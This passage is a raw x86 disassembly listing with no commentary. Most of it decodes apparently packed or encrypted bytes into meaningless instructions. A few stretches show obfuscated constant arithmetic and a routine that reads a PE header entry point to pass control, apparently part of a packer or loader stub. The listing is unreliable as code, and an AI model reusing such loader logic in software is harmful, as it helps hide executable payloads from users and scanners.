  405a79:	xor    DWORD PTR [ebx+0x30],edi
  405a7c:	int    0x95
  405a7e:	nop
  405a7f:	dec    ecx
  405a80:	mov    edx,0xc64445d0
  405a85:	or     al,0x98
  405a87:	jle    0x405a45
  405a89:	jnp    0x405a70
  405a8b:	ja     0x405a63
  405a8d:	add    DWORD PTR [ecx+0x1c108e9b],ecx
  405a93:	cmp    al,0x8d
  405a95:	pop    esp
  405a96:	inc    edx
  405a97:	adc    bh,bh
  405a99:	out    dx,eax
  405a9a:	jmp    0x4840:0x2e13a342
  405aa1:	arpl   WORD PTR [edx],si
  405aa3:	dec    edx
  405aa4:	mov    bh,0xc8
  405aa6:	mov    al,0x3a
  405aa8:	mov    dl,0x9c
  405aaa:	pop    ebx
  405aab:	and    edx,DWORD PTR [esi+0x3bd77679]
  405ab1:	xchg   al,dl
  405ab3:	dec    edi
  405ab4:	sbb    BYTE PTR [edi-0x5f],bl
  405ab7:	int    0xc1
  405ab9:	dec    esp
  405aba:	dec    esi
  405abb:	fdivr  DWORD PTR [edi-0x32]
  405abe:	add    eax,0x156799eb
  405ac3:	imul   eax,DWORD PTR es:[ebp+edx*2-0x6c],0x56
  405ac9:	adc    edx,edi
  405acb:	mov    esp,0x8330198c
  405ad0:	iret   
  405ad1:	inc    edx
  405ad2:	(bad)  
  405ad3:	mov    edx,0x7fd02b60
  405ad8:	fldenv [edi-0x4906a9d6]
  405ade:	push   ds
  405adf:	out    dx,eax
  405ae0:	mov    ch,BYTE PTR [edx]
  405ae2:	or     BYTE PTR [ebx],dl
  405ae4:	(bad)  
  405ae5:	push   ss
  405ae6:	(bad)  
  405ae7:	fwait
  405ae8:	xchg   esp,eax
  405ae9:	aad    0x87
  405aeb:	jmp    0x2b92:0xcc4eada
  405af2:	xchg   esi,eax
  405af3:	mov    dl,0x51
  405af5:	xor    al,0x7c
  405af7:	call   0x37d9493e
  405afc:	jo     0x405b45
  405afe:	mov    gs,WORD PTR [ebx]
  405b00:	sbb    edi,DWORD PTR [esi+esi*8]
  405b03:	clc    
  405b04:	xchg   edi,eax
  405b05:	shl    BYTE PTR [edi*4+0x62361c94],cl
  405b0c:	sub    eax,0x532c1da5
  405b11:	ds pop ebx
  405b13:	arpl   WORD PTR [ebx+eiz*8-0x449c3207],si
  405b1a:	ror    DWORD PTR [esi-0x1243303b],cl
  405b20:	(bad)  
  405b21:	jp     0x405b92
  405b23:	aad    0xd
  405b25:	add    bl,BYTE PTR [ebp+0x64e38c13]
  405b2b:	das    
  405b2c:	mov    BYTE PTR [edx+0x59],cl
  405b2f:	xchg   ebp,eax
  405b30:	lods   al,BYTE PTR ds:[esi]
  405b31:	push   0xffffff89
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43371b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4336d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433723,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43376f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4337af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x85eb7d84
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c31
  405be0:	add    eax,0x3f918a70
  405be5:	mov    ebx,0x929b1504
  405bea:	icebp  
  405beb:	add    eax,0x6b87fc3
  405bf0:	nop
  405bf1:	jno    0x405bdc
  405bf3:	out    0x6f,al
  405bf5:	inc    edx
  405bf6:	push   ss
  405bf7:	xor    al,0x64
  405bf9:	or     BYTE PTR ds:0xa6bda7a1,bl
  405bff:	or     eax,0xe2df210c
  405c04:	popa   
  405c05:	sub    DWORD PTR [edx-0x299f2624],edx
  405c0b:	aaa    
  405c0c:	xchg   esp,eax
  405c0d:	and    eax,0x77e6a695
  405c12:	add    eax,0x153bb1d4
  405c17:	test   BYTE PTR [ebp-0x12e948a0],dl
  405c1d:	ret    
  405c1e:	cmp    BYTE PTR [ebx+0x4bb01114],dl
  405c24:	fsubr  QWORD PTR [edx]
  405c26:	mov    cl,0x27
  405c28:	push   es
  405c29:	imul   ebx,ebx,0xcc05cd5d
  405c2f:	loop   0x405c77
  405c31:	cmp    BYTE PTR [ecx+0x2d0bc38d],0xe0
  405c38:	ss cwde 
  405c3a:	push   ebp
  405c3b:	imul   ebp,DWORD PTR [ecx+eax*1],0x2513a44e
  405c42:	int    0x85
  405c44:	in     eax,dx
  405c45:	stos   DWORD PTR es:[edi],eax
  405c46:	or     al,bh
  405c48:	leave  
  405c49:	lods   eax,DWORD PTR es:[esi]
  405c4b:	lea    ebp,[eax]
  405c4d:	(bad)  
  405c4e:	add    al,0x13
  405c50:	xor    BYTE PTR [ebx],ch
  405c52:	call   0x8cd8a96b
  405c57:	les    eax,FWORD PTR ds:[edi+0x74]
  405c5b:	fcmove st,st(6)
  405c5d:	push   ebx
  405c5e:	loop   0x405c72
  405c60:	xor    DWORD PTR [eax],esp
  405c62:	jb     0x405cce
  405c64:	and    BYTE PTR [esi],cl
  405c66:	sub    edi,DWORD PTR [ebp+0x57]
  405c69:	inc    DWORD PTR [ebx]
  405c6b:	pop    ecx
  405c6c:	aad    0x2
  405c6e:	ficom  WORD PTR [ecx-0x4f786c35]
  405c74:	adc    al,0xed
  405c76:	(bad)  
  405c77:	mov    eax,0x5dab84f
  405c7c:	mov    al,0x1a
  405c7e:	call   0xd10c:0x21dc633c
  405c85:	test   eax,0xb4e27a05
  405c8a:	sub    eax,0x86e8e403
  405c8f:	mov    edi,0xbb729aef
  405c94:	call   0x5bed:0x15c796b2
  405c9b:	stos   BYTE PTR es:[edi],al
  405c9c:	mov    dh,0xea
  405c9e:	test   al,dl
  405ca0:	lea    esi,[esi-0x4e5a4604]
  405ca6:	cmc    
  405ca7:	mov    al,0xe6
  405ca9:	retf   0x89ac
  405cac:	adc    esi,DWORD PTR [ecx+0x59]
  405caf:	mov    dh,0x3e
  405cb1:	mov    ebx,0x7c283a21
  405cb6:	mov    ebp,0xd4026184
  405cbb:	inc    ebx
  405cbc:	dec    eax
  405cbd:	out    0xbd,eax
  405cbf:	imul   BYTE PTR [esi+0x14]
  405cc2:	sbb    esi,edx
  405cc4:	fist   WORD PTR [edx+0x2]
  405cc7:	or     al,dl
  405cc9:	jle    0x405cad
  405ccb:	leave  
  405ccc:	sbb    eax,0xf08823c1
  405cd1:	mov    ebp,0xcbacee7f
  405cd6:	les    ecx,FWORD PTR [ecx-0x6a]
  405cd9:	push   cs
  405cda:	jmp    0x59ef36b8
  405cdf:	mov    al,BYTE PTR [esi+0x12]
  405ce2:	cdq    
  405ce3:	adc    DWORD PTR [edx+0x5914d843],edx
  405ce9:	inc    ebp
  405cea:	inc    esi
  405ceb:	sub    BYTE PTR [ebp+0x17],0xe4
  405cef:	ins    DWORD PTR es:[edi],dx
  405cf0:	mov    esp,0x6b129d4d
  405cf5:	pop    esi
  405cf6:	adc    BYTE PTR [ebx],ah
  405cf8:	adc    cl,BYTE PTR ds:0x77ad6de8
  405cfe:	call   0x22c0:0x53ffc43b
  405d05:	mov    ah,0x96
  405d07:	sub    ebx,0x78
  405d0a:	in     eax,0xc6
  405d0c:	cli    
  405d0d:	fcom   QWORD PTR [eax+0x14530224]
  405d13:	sbb    eax,0x5d8a428e
  405d18:	int3   
  405d19:	cmp    BYTE PTR [ecx-0x72],bh
  405d1c:	mov    bl,0xa5
  405d1e:	add    BYTE PTR [edx+0x7d1316f9],bh
  405d24:	sub    edx,esi
  405d26:	bound  ecx,QWORD PTR [ebx+0x2d89b976]
  405d2c:	outs   dx,BYTE PTR ds:[esi]
  405d2d:	sub    DWORD PTR ds:0xff92eae0,edx
  405d33:	test   esp,ebx
  405d35:	lock dec edx
  405d37:	outs   dx,DWORD PTR ds:[esi]
  405d38:	fisub  WORD PTR [eax]
  405d3a:	or     al,0xce
  405d3c:	or     esp,DWORD PTR cs:[ecx-0x4e]
  405d40:	aad    0x8a
  405d42:	mov    ebx,esi
  405d44:	sub    eax,0x68b76eb8
  405d49:	dec    esi
  405d4a:	add    eax,0x836e652a
  405d4f:	pop    ecx
  405d50:	in     al,0xb3
  405d52:	jo     0x405d13
  405d54:	mov    ah,0x5c
  405d56:	std    
  405d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d58:	ins    DWORD PTR es:[edi],dx
  405d59:	ds pushf 
  405d5b:	imul   edi,DWORD PTR [ecx+0x48979638],0xf60d87d1
  405d65:	mov    ds:0xb2da9c12,al
  405d6a:	mov    ebp,0x4158feac
  405d6f:	outs   dx,BYTE PTR ds:[esi]
  405d70:	nop
  405d71:	xchg   esi,eax
  405d72:	shl    ebx,1
  405d74:	adc    DWORD PTR [esi+ecx*1],edx
  405d77:	add    DWORD PTR [edi+0x5f],eax
  405d7a:	xor    al,0x1a
  405d7c:	add    al,0x5a
  405d7e:	es jbe 0x405d06
  405d81:	mov    WORD PTR [edx+0x4d],?
  405d84:	dec    esi
  405d85:	jmp    0xdd755de2
  405d8a:	mov    bh,0x54
  405d8c:	sbb    DWORD PTR [ecx],edi
  405d8e:	cmp    BYTE PTR [ecx-0xb98138d],cl
  405d94:	loop   0x405d38
  405d96:	push   ebx
  405d97:	push   esp
  405d98:	gs mov esp,0x7aa08bd0
  405d9e:	sub    al,BYTE PTR [edx]
  405da0:	ja     0x405de8
  405da2:	inc    esp
  405da3:	dec    esp
  405da5:	das    
  405da6:	(bad)  
  405da7:	rcr    dl,1
  405da9:	outs   dx,BYTE PTR ds:[esi]
  405daa:	inc    edx
  405dab:	cmp    DWORD PTR [edi+0x7d],esi
  405dae:	aaa    
  405daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405db0:	push   ss
  405db1:	fistp  WORD PTR [edi+edx*1-0x25]
  405db5:	push   0xffffffe1
  405db7:	outs   dx,BYTE PTR cs:[esi]
  405db9:	out    0xcf,eax
  405dbb:	jmp    0x405d94
  405dbd:	and    DWORD PTR [ebx+0x5a6829bd],ecx
  405dc3:	test   al,0x3d
  405dc5:	add    eax,0x7b65ae12
  405dca:	xchg   ebp,eax
  405dcb:	scas   eax,DWORD PTR es:[edi]
  405dcc:	lock cwde 
  405dce:	or     edi,0x40
  405dd1:	jmp    0x405df6
  405dd3:	sahf   
  405dd4:	or     esp,eax
  405dd6:	imul   edx,DWORD PTR [ebx+0x13],0xffffffc7
  405dda:	bnd ret 
  405ddc:	mov    edi,0xc60a1c79
  405de1:	sbb    cl,BYTE PTR [eax+0x25]
  405de4:	push   eax
  405de5:	xchg   ebx,eax
  405de6:	sub    BYTE PTR [ebx-0x7d],dl
  405de9:	call   0xd1ea3fa4
  405dee:	in     al,dx
  405def:	idiv   DWORD PTR [ecx-0x643f22cd]
  405df5:	sar    esi,0x34
  405df8:	jbe    0x405dd3
  405dfa:	aam    0xea
  405dfc:	hlt    
  405dfd:	pop    es
  405dfe:	push   ss
  405dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e00:	rol    BYTE PTR [eax],cl
  405e02:	jmp    0x5b19:0x97bfcec7
  405e09:	inc    ecx
  405e0a:	or     al,0xd5
  405e0c:	fstp   TBYTE PTR ds:0x16a5914e
  405e12:	add    DWORD PTR ds:0x97b23c5e,esi
  405e18:	xchg   ecx,eax
  405e19:	push   edx
  405e1a:	lahf   
  405e1b:	mov    eax,DWORD PTR [ecx]
  405e1d:	pop    esi
  405e1e:	mov    edx,0x6fbcc262
  405e23:	in     al,dx
  405e24:	mov    edi,0x3cf30212
  405e29:	mov    edi,esi
  405e2b:	jecxz  0x405e6e
  405e2d:	jl     0x405dc5
  405e2f:	inc    edx
  405e30:	cmp    cl,0x2f
  405e33:	sub    ebp,DWORD PTR [edx+0x34]
  405e36:	scas   eax,DWORD PTR es:[edi]
  405e37:	ret    0x6178
  405e3a:	jg     0x405e29
  405e3c:	or     esp,edi
  405e3e:	push   esp
  405e3f:	ja     0x405dca
  405e41:	idiv   BYTE PTR [esi-0x2f]
  405e44:	lahf   
  405e45:	mov    ch,0x5e
  405e47:	fadd   DWORD PTR ds:[eax+edx*1]
  405e4b:	cli    
  405e4c:	sub    dh,bh
  405e4e:	and    BYTE PTR [eax+0x2c],0xc2
  405e52:	xchg   esp,eax
  405e53:	jns    0x405ed4
  405e55:	xor    eax,0xdf8f00ac
  405e5a:	int    0xd1
  405e5c:	test   DWORD PTR [esi+0x0],ebp
  405e5f:	xchg   BYTE PTR [edx+ebp*4],al
  405e62:	cmp    al,0x13
  405e64:	cmp    eax,0x810f3772
  405e69:	sbb    dl,bl
  405e6b:	retf   0x4fab
  405e6e:	sbb    esp,DWORD PTR [ecx]
  405e70:	jp     0x405e44
  405e72:	test   DWORD PTR [edi-0x561fd4a3],edi
  405e78:	ret    0xf04b
  405e7b:	adc    al,0xfe
  405e7d:	call   0xf6cf:0x4093d903
  405e84:	sbb    DWORD PTR [ebp+0x38],0x499d104e
  405e8b:	stc    
  405e8c:	inc    ecx
  405e8d:	repnz dec edi
  405e8f:	test   eax,0x135c19fd
  405e95:	xlat   BYTE PTR ds:[ebx]
  405e96:	ds imul esp,ebx,0x2b
  405e9a:	xchg   esi,eax
  405e9b:	push   es
  405e9c:	js     0x405eff
  405e9e:	and    edi,esi
  405ea0:	cld    
  405ea1:	jns    0x405e34
  405ea3:	pop    edx
  405ea4:	retf   0x192f
  405ea7:	jmp    0xf09e13b
  405eac:	mov    bh,0x93
  405eae:	jo     0x405e41
  405eb0:	sbb    eax,DWORD PTR [ebx+0x16]
  405eb3:	mov    esi,0x320aac1c
  405eb8:	dec    ecx
  405eb9:	push   0xffffffb8
  405ebb:	loop   0x405ed6
  405ebd:	pop    ebx
  405ebe:	xlat   BYTE PTR ds:[ebx]
  405ebf:	icebp  
  405ec0:	or     DWORD PTR [ebx+0x71],esp
  405ec3:	add    DWORD PTR [edi-0x9551284],edx
  405ec9:	fsub   DWORD PTR [eax]
  405ecb:	bound  ebp,QWORD PTR [edx-0x7290ddcc]
  405ed1:	jmp    0xda37e08c
  405ed6:	add    eax,0xcc1260e5
  405edb:	pushf  
  405edc:	adc    al,0xea
  405ede:	mov    ds:0xc0ab15e3,al
  405ee3:	cmp    eax,0x40cd2f3a
  405ee8:	inc    esi
  405ee9:	push   edi
  405eea:	push   ecx
  405eeb:	jae    0x405f15
  405eed:	ins    DWORD PTR es:[edi],dx
  405eee:	dec    ebp
  405eef:	cld    
  405ef0:	(bad)  
  405ef1:	sub    al,0xba
  405ef3:	mov    eax,0xc757b395
  405ef8:	push   DWORD PTR [edi+0x57]
  405efb:	adc    DWORD PTR [edx+0x41],ebx
  405efe:	(bad)  
  405eff:	enter  0xd90d,0xe7
  405f03:	dec    eax
  405f04:	and    DWORD PTR [ecx-0x459ac688],0xffffffa2
  405f0b:	ss scas eax,DWORD PTR es:[edi]
  405f0d:	jo     0x405f7c
  405f0f:	jp     0x405f00
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ebx-0x59a04ce8],ds
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	int    0x14
  405f34:	push   ds
  405f35:	(bad)  
  405f36:	out    dx,al
  405f37:	adc    ecx,edx
  405f39:	push   0x18
  405f3b:	xor    eax,0x26c85525
  405f40:	into   
  405f41:	jle    0x405f36
  405f43:	scas   eax,DWORD PTR es:[edi]
  405f44:	push   ecx
  405f45:	ss push ebp
  405f47:	dec    esp
  405f48:	jne    0x405f62
  405f4a:	xlat   BYTE PTR ds:[ebx]
  405f4b:	in     al,0xe1
  405f4d:	mov    DWORD PTR [ebx+0x3a],esi
  405f50:	mov    DWORD PTR [ebp+0x74032ab7],0x34d42772
  405f5a:	xchg   edx,eax
  405f5b:	jne    0x405f7f
  405f5d:	push   cs
  405f5e:	aaa    
  405f5f:	mov    BYTE PTR [esi-0x3c],cl
  405f62:	int3   
  405f63:	mov    DWORD PTR [edx],ebx
  405f65:	cmp    esi,DWORD PTR [edi-0x775b5433]
  405f6b:	fs jnp 0x405fe1
  405f6e:	scas   al,BYTE PTR es:[edi]
  405f6f:	(bad)  
  405f70:	fwait
  405f71:	aad    0x56
  405f73:	iret   
  405f74:	mov    edx,0x786833d0
  405f79:	rol    BYTE PTR [ecx+0xd],0xf2
  405f7d:	je     0x405fc8
  405f7f:	adc    al,0xc0
  405f81:	adc    dh,BYTE PTR ds:0xf1452936
  405f87:	xchg   esi,eax
  405f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f89:	inc    ecx
  405f8a:	mov    ch,0xf7
  405f8c:	mov    al,bl
  405f8e:	adc    bl,BYTE PTR [edx-0x1]
  405f91:	push   ebp
  405f92:	inc    dl
  405f94:	out    0xaf,eax
  405f96:	cmp    ah,BYTE PTR [ebx+ecx*4-0x32]
  405f9a:	cli    
  405f9b:	and    BYTE PTR [ebp-0x80],ch
  405f9e:	mov    al,0xbb
  405fa0:	mov    dl,BYTE PTR [edx+0x5a67d36]
  405fa6:	push   es
  405fa7:	jmp    0xfdcf:0x81c3d6dc
  405fae:	push   es
  405faf:	scas   al,BYTE PTR es:[edi]
  405fb0:	cmp    eax,0x4e415c6f
  405fb5:	jae    0x405fcc
  405fb7:	pop    es
  405fb8:	ret    
  405fb9:	push   ds
  405fba:	add    edx,DWORD PTR [ecx-0x63]
  405fbd:	lds    esp,FWORD PTR [edx]
  405fbf:	ffreep st(6)
  405fc1:	dec    esi
  405fc2:	xor    al,0x8f
  405fc4:	cld    
  405fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc6:	call   0x72a60458
  405fcb:	adc    DWORD PTR [esi-0x1e],esp
  405fce:	(bad)  
  405fcf:	jp     0x406046
  405fd1:	mov    dh,0x59
  405fd3:	pop    esi
  405fd4:	mov    edi,0x42090446
  405fd9:	xchg   edx,esi
  405fdb:	jne    0x406036
  405fdd:	in     al,0xde
  405fdf:	cmc    
  405fe0:	int    0x76
  405fe2:	loope  0x405fa0
  405fe4:	jb     0x406043
  405fe6:	jb     0x406053
  405fe8:	jns    0x405f74
  405fea:	cmp    eax,0xb6cedae2
  405fef:	push   0xe06eee88
  405ff4:	xchg   bh,dh
  405ff6:	pop    ss
  405ff7:	aam    0x10
  405ff9:	jno    0x405f9e
  405ffb:	pop    esi
  405ffc:	repnz ins BYTE PTR es:[edi],dx
  405ffe:	idiv   DWORD PTR [ebx]
  406000:	fisub  DWORD PTR [edx+0x31]
  406003:	push   esi
  406004:	pop    edx
  406005:	pushf  
  406006:	add    BYTE PTR [eax+ecx*4+0x31],0x3c
  40600b:	and    eax,0xf1b4b1bf
  406010:	xor    bl,BYTE PTR [esi+0x6c]
  406013:	clc    
  406014:	sub    eax,0xc6ffb5fa
  406019:	stos   BYTE PTR es:[edi],al
  40601a:	pusha  
  40601b:	inc    eax
  40601c:	dec    eax
  40601d:	mov    ebx,0xb1cb9c1
  406022:	jbe    0x40600f
  406024:	aaa    
  406025:	jge    0x406077
  406027:	mov    ah,0x6
  406029:	loopne 0x405fcb
  40602b:	jmp    0x1b85e96e
  406030:	not    DWORD PTR [edi+0x5d]
  406033:	inc    edi
  406034:	push   0x3f4720a4
  406039:	jb     0x406028
  40603b:	xchg   DWORD PTR [ebp+0xad234ce],edi
  406041:	dec    esi
  406042:	mov    al,0xbf
  406044:	scas   al,BYTE PTR es:[edi]
  406045:	xchg   ecx,eax
  406046:	enter  0xca41,0x5f
  40604a:	and    BYTE PTR [ebp+edi*8-0x665567e],dh
  406051:	or     cl,BYTE PTR [edi+0x4cb81ba5]
  406057:	stc    
  406058:	into   
  406059:	cmp    edx,edi
  40605b:	out    dx,eax
  40605c:	hlt    
  40605d:	je     0x406004
  40605f:	push   0xffffffdc
  406061:	out    dx,al
  406062:	pop    es
  406063:	clc    
  406064:	call   0x2163e475
  406069:	xchg   ecx,eax
  40606a:	mov    cl,0x97
  40606c:	push   cs
  40606d:	adc    eax,0x62898b34
  406072:	pop    edx
  406073:	add    DWORD PTR [ebp-0x3652b227],0xb7e9d5a8
  40607d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40607e:	pop    ebx
  40607f:	xchg   esp,eax
  406080:	adc    BYTE PTR [eax],cl
  406082:	pop    esp
  406083:	jne    0x4060b3
  406085:	inc    ebp
  406086:	iret   
  406087:	mov    al,0xf2
  406089:	test   BYTE PTR ds:0x777e304c,ch
  40608f:	dec    esp
  406090:	and    DWORD PTR [ecx+0x7a001ea2],edx
  406096:	jno    0x4060b5
  406098:	pop    edx
  406099:	imul   ebx,ebx,0x6de575e1
  40609f:	cmp    DWORD PTR [ebp-0x4b],esp
  4060a2:	dec    esp
  4060a3:	je     0x4060f5
  4060a5:	sar    DWORD PTR [edi-0x6eff254f],cl
  4060ab:	sbb    eax,0xa056685d
  4060b0:	ffree  st(0)
  4060b2:	sub    DWORD PTR [ebp+0x17],esp
  4060b5:	or     al,0xa1
  4060b7:	xchg   esi,eax
  4060b8:	pop    ebp
  4060b9:	test   eax,0x75d7907d
  4060be:	xchg   DWORD PTR [edx+0x2b],ebp
  4060c1:	lahf   
  4060c2:	fimul  DWORD PTR [eax+0x5ddb64f3]
  4060c8:	push   esi
  4060c9:	or     edx,DWORD PTR [ebp+0x53]
  4060cc:	call   0xcc2d:0x76c5cef5
  4060d3:	out    0x1,eax
  4060d5:	inc    eax
  4060d6:	pop    ebp
  4060d7:	mov    DWORD PTR [edx],edx
  4060d9:	mov    esi,0xfc0a776b
  4060de:	sub    DWORD PTR [esi-0x20b64f0f],0x3c
  4060e5:	std    
  4060e6:	outs   dx,BYTE PTR ds:[esi]
  4060e7:	jmp    0x40607b
  4060e9:	and    BYTE PTR [eax-0x26],0x5c
  4060ed:	pushf  
  4060ee:	and    cl,BYTE PTR [edi-0x65c177d2]
  4060f4:	push   edi
  4060f5:	scas   eax,DWORD PTR es:[edi]
  4060f6:	sbb    al,0x5a
  4060f8:	pusha  
  4060f9:	dec    ebx
  4060fa:	into   
  4060fb:	add    ebp,DWORD PTR [ebx-0x1f]
  4060fe:	data16 into 
  406100:	adc    ebp,DWORD PTR [eax+ebx*8+0x2fa29102]
  406107:	dec    ecx
  406108:	xchg   edx,eax
  406109:	pop    edx
  40610a:	add    ch,bh
  40610c:	push   0x7607a34e
  406111:	jmp    0x4060db
  406113:	mov    edx,0x6430218c
  406118:	jmp    0xca1565d2
  40611d:	jmp    0x5508:0x4d6cdd54
  406124:	pop    ecx
  406125:	pop    eax
  406126:	(bad)  
  406127:	lods   al,BYTE PTR ds:[esi]
  406128:	cmp    ebp,DWORD PTR [eax-0x1cf9ed90]
  40612e:	hlt    
  40612f:	(bad)  
  406130:	retf   
  406131:	test   al,0x26
  406133:	loop   0x406123
  406135:	xchg   ecx,eax
  406136:	aad    0x9e
  406138:	mov    ds:0x9b569be7,eax
  40613d:	cs das 
  40613f:	sub    ch,BYTE PTR [ebx-0x66]
  406142:	inc    esi
  406143:	out    dx,al
  406144:	add    eax,0x2e608cf0
  406149:	ffree  st(7)
  40614b:	xchg   esp,eax
  40614c:	icebp  
  40614d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40614e:	lea    edi,[ebx]
  406150:	xor    eax,0x79bdc49c
  406155:	into   
  406156:	repnz pop esp
  406158:	sub    dh,bh
  40615a:	test   al,0xc5
  40615c:	cli    
  40615d:	mov    dh,0xc2
  40615f:	and    ebp,DWORD PTR [esi+0x14dbe031]
  406165:	(bad)
  406169:	jne    0x40611b
  40616b:	push   esp
  40616c:	aas    
  40616d:	push   cs
  40616e:	into   
  40616f:	and    bl,BYTE PTR [edx+0x7d838328]
  406175:	pop    eax
  406176:	mov    ds:0xde973e69,al
  40617b:	ins    BYTE PTR es:[edi],dx
  40617c:	lds    ecx,FWORD PTR [ebx-0x6f]
  40617f:	fstp   DWORD PTR [ecx-0x11]
  406182:	jns    0x40616f
  406184:	mov    DWORD PTR [esi],ecx
  406186:	xor    DWORD PTR [edx],esp
  406188:	scas   al,BYTE PTR es:[edi]
  406189:	add    eax,0x2f458c56
  40618e:	add    ebx,DWORD PTR ds:0xc8e15ed
  406194:	or     BYTE PTR [edi-0x6a],0xb6
  406198:	scas   al,BYTE PTR es:[edi]
  406199:	(bad)  
  40619a:	sbb    DWORD PTR [esi-0xe],ebx
  40619d:	popf   
  40619e:	mov    ch,0x7e
  4061a0:	mov    al,ds:0x789ef3c3
  4061a5:	and    eax,0x81d640ee
  4061aa:	jmp    0x799fb2fa
  4061af:	test   edx,edx
  4061b1:	or     ecx,ebx
  4061b3:	out    dx,al
  4061b4:	xor    dh,BYTE PTR [edi-0x12e5cdf4]
  4061ba:	jnp    0x40620c
  4061bc:	je     0x406178
  4061be:	pusha  
  4061bf:	mov    DWORD PTR [ebp-0x622a52d3],0x30f68a86
  4061c9:	cs jns 0x40621a
  4061cc:	ja     0x406183
  4061ce:	xchg   BYTE PTR [edx+0x47],cl
  4061d1:	in     eax,dx
  4061d2:	jmp    0x406205
  4061d4:	ins    BYTE PTR es:[edi],dx
  4061d5:	addr16 (bad) 
  4061d7:	pop    edi
  4061d8:	es daa 
  4061da:	fcomp  st(1)
  4061dc:	add    al,0x9c
  4061de:	adc    al,0x49
  4061e0:	xchg   edi,eax
  4061e1:	(bad)  
  4061e2:	mov    eax,0x65f359f7
  4061e7:	pushf  
  4061e8:	in     eax,dx
  4061e9:	icebp  
  4061ea:	sbb    DWORD PTR [ecx-0x10161ec9],0x60b01e18
  4061f4:	in     al,dx
  4061f5:	into   
  4061f6:	inc    edx
  4061f7:	je     0x40617a
  4061f9:	pmullw mm1,QWORD PTR [ebx+0x187feb4a]
  406200:	aad    0xb9
  406202:	dec    ebx
  406203:	sub    al,0x71
  406205:	imul   ecx,DWORD PTR [edx+0x13],0xffffff93
  406209:	outs   dx,BYTE PTR ds:[esi]
  40620a:	xor    eax,edx
  40620c:	mov    ah,0x8d
  40620e:	or     DWORD PTR [ebx],eax
  406210:	xor    BYTE PTR [edi+0x255d42f0],dl
  406216:	imul   edi,DWORD PTR [esi+esi*4+0x6bb017dd],0x58
  40621e:	cdq    
  40621f:	mov    eax,0x498556c5
  406224:	or     bl,BYTE PTR [ecx-0x3f22dbf6]
  40622a:	add    DWORD PTR ds:0x321733a6,esp
  406230:	push   edi
  406231:	add    dh,bl
  406233:	sar    BYTE PTR ds:0x5f8c7da,1
  406239:	or     eax,0x5424a0e6
  40623e:	dec    ebx
  40623f:	dec    ebp
  406240:	ds xchg esp,eax
  406242:	pop    edi
  406243:	enter  0xf75f,0xfa
  406247:	jns    0x40625d
  406249:	add    BYTE PTR [ebp-0x42],0xce
  40624d:	out    dx,al
  40624e:	mov    ds:0x69713180,al
  406253:	mov    al,ds:0x330b1e65
  406258:	pop    ss
  406259:	mov    ds:0x369cd1ab,al
  40625e:	inc    esp
  40625f:	data16 aaa 
  406261:	cmp    DWORD PTR [edx],0x81f0330b
  406267:	and    eax,0x4337a3
  40626c:	add    BYTE PTR [eax],al
  40626e:	add    BYTE PTR [eax],al
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4337a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4337a3,ecx
  406282:	cmp    DWORD PTR ds:0x4337a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4337a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4337a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4337a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4337a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
